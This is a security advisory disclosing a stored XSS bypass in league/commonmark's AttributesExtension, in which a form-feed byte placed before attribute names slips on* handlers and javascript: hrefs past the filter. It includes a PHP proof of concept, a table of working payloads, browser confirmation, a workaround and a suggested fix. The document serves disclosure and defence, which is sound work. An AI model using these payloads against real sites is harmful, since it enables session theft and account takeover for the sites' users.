# league/commonmark XSS: `on*` event-handler filter in `AttributesExtension` bypassed with a U+000C form feed

- GHSA: GHSA-f8fg-pg57-v4j8
- CVE: None
- Published: 2026-09-01T20:18:29Z
- GHSA severity: high
- CVSS v3.1: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:L/A:N (7.2)
- CWE: CWE-79, CWE-86
- Packages: composer:league/commonmark
- Source: https://github.com/advisories/GHSA-f8fg-pg57-v4j8

---

### Summary

The `AttributesExtension` documents a security guarantee:

> **Note:** Attributes starting with `on` (e.g. `onclick` or `onerror`) are capable of executing
> JavaScript code and are therefore **never allowed by default**. You must explicitly add them to
> the `allow` list if you want to use them.
>
> — `docs/2.x/extensions/attributes.md`

Prefixing the attribute name with a single U+000C FORM FEED byte defeats that guarantee.
`{<FF>onclick="alert(1)"}` passes through `AttributesHelper::filterAttributes()` untouched and is
written verbatim into the output, where browsers parse it as a genuine `onclick` handler.

The same prefix defeats the `allow_unsafe_links` check, letting a `javascript:` URI through on
`href` / `src` even when `allow_unsafe_links` is `false`.

This bypasses the fix shipped in the **2.7.0 security release** ("Fix XSS in AttributesExtension",
43207253ea5f14867c77c697cd3838c446cadcea), which added `filterAttributes()` for the express
purpose of blocking these attributes.

Throughout this report `<FF>` denotes a literal U+000C byte (`"\x0C"` in PHP). It is invisible in
rendered text, so all payloads below are written with PHP escape sequences to stay unambiguous.

### Details

Three behaviours combine.

**1. `\x0C` survives the parser's `trim()`.**

`AttributesHelper::SINGLE_ATTRIBUTE` begins with `\s*`, and `Cursor::match()` returns
`$matches[0][0]` — the *entire* match, including that leading whitespace. The result is cleaned
with PHP's `trim()`:

```php
// src/Extension/Attributes/Util/AttributesHelper.php:62
while ($attribute = \trim((string) $attributeCursor->match('/^' . self::SINGLE_ATTRIBUTE . '/i'))) {
```

PCRE `\s` matches `\x0C`, but PHP's default `trim()` charlist is `" \t\n\r\0\x0B"` — it includes
the vertical tab `\x0B` but **not** the form feed `\x0C`. The byte is therefore consumed by the
regex, retained in the returned match, and not stripped. It ends up inside the attribute name:

```php
// src/Extension/Attributes/Util/AttributesHelper.php:94
$attributes[\trim($name)] = \trim($value);   // $name === "\x0Conclick"
```

`\x0C` is the only byte with this property: every other character the HTML5 tokenizer treats as
whitespace (`\x09`, `\x0A`, `\x0D`, `\x20`), plus `\x0B`, is in PHP's trim charlist. The PoC
includes a `\x0B` case as a control, and it is correctly stripped.

**2. The filter's string comparisons miss it.**

`filterAttributes()` compares the raw name against literal strings:

```php
// src/Extension/Attributes/Util/AttributesHelper.php:148-166
$attrNameLower = \strtolower($name);                            // "\x0conclick"
... ($attrNameLower === 'href' || $attrNameLower === 'src') ... // false
... \str_starts_with($attrNameLower, 'on') ...                  // false -> not removed
```

**3. The renderer never escapes attribute names.**

```php
// src/Util/HtmlElement.php:123-129
$result .= ' ' . $key . '="' . Xml::escape($value) . '"';   // $key emitted raw
```

Because the HTML5 tokenizer treats `\x0C` as whitespace *between* attributes, the browser reads
the name as plain `onclick`.

### PoC

```php
<?php
require 'vendor/autoload.php';

use League\CommonMark\Environment\Environment;
use League\CommonMark\Extension\Attributes\AttributesExtension;
use League\CommonMark\Extension\CommonMark\CommonMarkCoreExtension;
use League\CommonMark\MarkdownConverter;

// The most defensive configuration docs/2.x/security.md recommends.
$env = new Environment([
    'html_input'         => 'escape',
    'allow_unsafe_links' => false,
    'max_nesting_level'  => 100,
    // 'attributes' => ['allow' => [...]] deliberately left at its default []
]);
$env->addExtension(new CommonMarkCoreExtension());
$env->addExtension(new AttributesExtension());
$converter = new MarkdownConverter($env);

$FF = "\x0C";

echo $converter->convert('hello {onclick="alert(1)"}')->getContent();
// <p>hello</p>                                    <- filtered, as documented

echo $converter->convert('hello {' . $FF . 'onclick="alert(1)"}')->getContent();
// <p \x0Conclick="alert(1)">hello</p>             <- BYPASS
```

Full observed output (`\x0C` shown escaped; it is a literal single byte in the real output):

| # | Markdown input | Rendered output | Result |
|---|---|---|---|
| A | `hello {onclick="alert(1)"}` | `<p>hello</p>` | filtered (control) |
| B | `hello {\x0Conclick="alert(1)"}` | `<p \x0Conclick="alert(1)">hello</p>` | **bypass** |
| C | `hello {\x0Bonclick="alert(1)"}` | `<p>hello</p>` | filtered (control) |
| D | `[click](javascript:alert(1))` | `<p><a>click</a></p>` | filtered (control) |
| E | `[click](https://example.com){\x0Chref="javascript:alert(1)"}` | `<p><a \x0Chref="javascript:alert(1)" href="https://example.com">click</a></p>` | **bypass** |
| F | `![x](https://example.invalid/x.png){\x0Conerror="alert(1)"}` | `<p><img \x0Conerror="alert(1)" src="…" alt="x" /></p>` | **bypass** |
| G | `# heading` + newline + `{\x0Conclick="alert(1)"}` | `<h1 \x0Conclick="alert(1)">heading</h1>` | **bypass** (block syntax) |

In case E the injected `href` precedes the legitimate one. Per the HTML5 duplicate-attribute rule
the **first** occurrence wins, so the `javascript:` URI is the one the browser actually uses.

**Browser confirmation.** Loading the library's unmodified output in Chrome for Testing 148:

```
<img> attribute names : ["onerror","src","alt"]      <- parsed as a real `onerror`
typeof img.onerror    : function                     <- bound as an event handler
handlers fired        : ["img-onerror"]              <- fired on load, no interaction
document.title        : XSS-FIRED
link href attribute   : "javascript:void(0)"
link href property    : "javascript:void(0)"         <- javascript: URI is the effective href
page errors           : []
```

The `onerror` case executes with **no user interaction** — rendering the attacker's Markdown is
sufficient.

Verified against git HEAD (`f966b17a`) and against tag `2.9.0`, on PHP 8.5.8.

### Impact

Stored cross-site scripting in any application that renders untrusted Markdown with
`AttributesExtension` enabled and `attributes.allow` left at its default `[]` — even when the
application has followed every hardening step in `docs/2.x/security.md`
(`html_input => 'escape'`, `allow_unsafe_links => false`, `max_nesting_level => 100`).

Consequences are the usual for stored XSS: session and cookie theft, actions performed as the
viewing user, and account takeover where the host application permits it. Because the payload can
be attached to an image (`onerror`), it fires on page load without requiring the victim to
interact with anything.

The affected configuration is the extension's default: `attributes.allow` defaults to `[]`, and
the documentation describes that default as safe with respect to `on*` attributes.

### Workaround for users

Setting an explicit allow list takes the other branch of `filterAttributes()`, which drops the
form-feed name because it is not in the list:

```php
$config = ['attributes' => ['allow' => ['id', 'class', 'align']]];
```

Verified: `hello {\x0Conclick="alert(1)"}` then renders as `<p>hello</p>`.

### Suggested fix

The narrow fix is to add `\x0C` to the trim charlist at `AttributesHelper.php` lines 62, 89, 90
and 94. That closes this instance but leaves the shape of the problem in place.

A more durable fix is to reject anything that is not a well-formed attribute name in
`filterAttributes()`, reusing the constant the parser already defines (`RegexHelper` is already
imported in that file):

```php
foreach ($attributes as $name => $value) {
    // Names are compared against literal strings below and emitted without escaping,
    // so anything that isn't a plain attribute name must not get through.
    if (\preg_match('/^' . RegexHelper::PARTIAL_ATTRIBUTENAME . '$/i', $name) !== 1) {
        unset($attributes[$name]);
        continue;
    }

    $attrNameLower = \strtolower($name);
    // ... existing logic unchanged
}
```

As defence in depth, `HtmlElement::__toString()` could validate or escape `$key`. It currently
trusts its callers to supply safe attribute names, and `filterAttributes()` is the only thing
standing between that method and user-supplied input.
